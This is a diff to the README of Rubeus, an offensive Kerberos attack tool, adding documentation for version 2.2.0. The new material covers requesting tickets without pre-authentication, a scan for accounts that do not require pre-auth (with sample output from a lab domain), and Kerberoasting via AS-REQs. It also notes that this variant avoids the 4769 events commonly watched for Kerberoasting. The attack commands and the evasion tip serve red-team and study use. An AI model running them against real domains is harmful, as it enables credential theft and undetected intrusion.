@@ -81,7 +81,7 @@ Rubeus is licensed under the BSD 3-Clause license.
       | |  \ \| |_| | |_) ) ____| |_| |___ |
       |_|   |_|____/|____/|_____)____/(___/
 
-      v2.1.1
+      v2.2.0
 
 
      Ticket requests and renewals:
@@ -104,6 +104,12 @@ Rubeus is licensed under the BSD 3-Clause license.
         Retrieve a TGT suitable for changing an account with an expired password using the changepw command
             Rubeus.exe asktgt /user:USER </password:PASSWORD /changepw [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/proxyurl:https://KDC_PROXY/kdcproxy]
 
+        Request a TGT without sending pre-auth data:
+            Rubeus.exe asktgt /user:USER [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/nopac] [/proxyurl:https://KDC_PROXY/kdcproxy]
+
+        Request a service ticket using an AS-REQ:
+            Rubeus.exe asktgt /user:USER /service:SPN </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] [/nopac] [/oldsam] [/proxyurl:https://KDC_PROXY/kdcproxy]
+
        Retrieve a service ticket for one or more SPNs, optionally saving or applying the ticket:
             Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/enterprise] [/opsec] </tgs:BASE64 | /tgs:FILE.KIRBI> [/targetdomain] [/u2u] [/targetuser] [/servicekey:PASSWORDHASH] [/asrepkey:ASREPKEY] [/proxyurl:https://KDC_PROXY/kdcproxy]
 
@@ -112,6 +118,9 @@ Rubeus is licensed under the BSD 3-Clause license.
 
         Perform a Kerberos-based password bruteforcing attack:
             Rubeus.exe brute </password:PASSWORD | /passwords:PASSWORDS_FILE> [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose] [/nowrap]
+
+        Perform a scan for account that do not require pre-authentication:
+            Rubeus.exe preauthscan /users:C:\temp\users.txt [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/proxyurl:https://KDC_PROXY/kdcproxy]
 
 
      Constrained delegation abuse:
@@ -240,6 +249,9 @@ Rubeus is licensed under the BSD 3-Clause license.
         Perform AES Kerberoasting:
             Rubeus.exe kerberoast /aes [/ldaps] [/nowrap]
 
+        Perform Kerberoasting using an account without pre-auth by sending AS-REQ's:
+            Rubeus.exe kerberoast </spn:""blah/blah"" | /spns:C:\temp\spns.txt> /preauth:USER /domain:DOMAIN [/dc:DOMAIN_CONTROLLER] [/nowrap]
+
         Perform AS-REP "roasting" for any users without preauth:
             Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]
 
@@ -353,6 +365,7 @@ Breakdown of the ticket request commands:
 | [asktgs](#asktgs) | Request a service ticket from a passed TGT |
 | [renew](#renew) | Renew (or autorenew) a TGT or service ticket |
 | [brute](#brute) | Perform a Kerberos-based password bruteforcing attack. 'spray' can also be used instead of 'brute' |
+| [preauthscan](#preauthscan) | Preform a scan for accounts that do not require Kerberos pre-authentication |
 
 
 ### asktgt
@@ -368,6 +381,8 @@ PKINIT authentication is supported with the `/certificate:X` argument. When the 
 Requesting a TGT without a PAC can be done using the `/nopac` switch.
 
 Using a KDC proxy ([MS-KKDCP](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kkdcp/5bcebb8d-b747-4ee5-9453-428aec1c5c38)) to make the request is possible using the `/proxyurl:URL` argument. The full URL for the KDC proxy is required, eg. https://kdcproxy.exmaple.com/kdcproxy
+
+The `/nopreauth` flag can be used to send an AS-REQ without pre-authentication. The `/service:SPN` argument can be used to request service tickets using AS-REQ's directly, it will take an SPN or a username.
 
 Requesting a ticket via RC4 hash for **dfm.a@testlab.local**, applying it to the current logon session:
 
@@ -1012,6 +1027,31 @@ The **brute** action will perform a Kerberos-based password bruteforcing or pass
 
           doIFLDCCBSigAwIBBaEDAgEWooIELDCCBChhggQkMIIEIKADAgEFoRAbDlR...(snip)...
 
+### preauthscan
+
+The **preauthscan** action will send AS-REQ's for all usernames passed into the `/users` argument to discover accounts that do not require Kerberos pre-authentication.
+
+    C:\Rubeus>Rubeus.exe preauthscan /users:uns.txt /domain:semperis.lab /dc:192.168.71.220
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v2.2.0
+
+    [*] Action: Scan for accounts not requiring Kerberos Pre-Authentication
+
+    [*] cclark: Pre-Auth Required
+    [*] jjones: Pre-Auth Not Required
+    [*] rwilliams: Pre-Auth Required
+    [*] svc_sqlserver: Pre-Auth Required
+    [*] pgreen: Pre-Auth Required
+    [*] jsmith: Pre-Auth Required
+    [*] tnahum: Pre-Auth Required
+    [*] sfederovsky: Pre-Auth Required
 
 ## Constrained delegation abuse
 
@@ -2992,6 +3032,8 @@ If the `/autoenterprise` flag is used, if roasting an SPN fails (due to an inval
 
 If the `/ldaps` flag is used, any LDAP queries will go over TLS (port 636).
 
+If the `/preauth:USER` argument is used, either the `/spn:Y` or `/spns:Y` argument is required. The `/preauth:USER` argument will attempt to send AS-REQ's with the service being those passed in `/spn:Y` or `/spns:Y` to request service tickets.
+
 
 #### kerberoasting opsec
 
@@ -3008,6 +3050,7 @@ Here is a table comparing the behavior of various flags from an opsec perspectiv
 | **/pwdsetafter:X** | Use the supplied date and only enumerate accounts with password last changed after that date |
 | **/pwdsetbefore:X** | Use the supplied date and only enumerate accounts with password last changed before that date |
 | **/resultlimit:X** | Use the specified number to limit the accounts that will be roasted |
+| **/preauth:USER** | Will send AS-REQ's rather than TGS-REQ's which results in 4768 events instead of the 4769 frequently monitored for kerberoasting detections |
 
 #### Examples
 
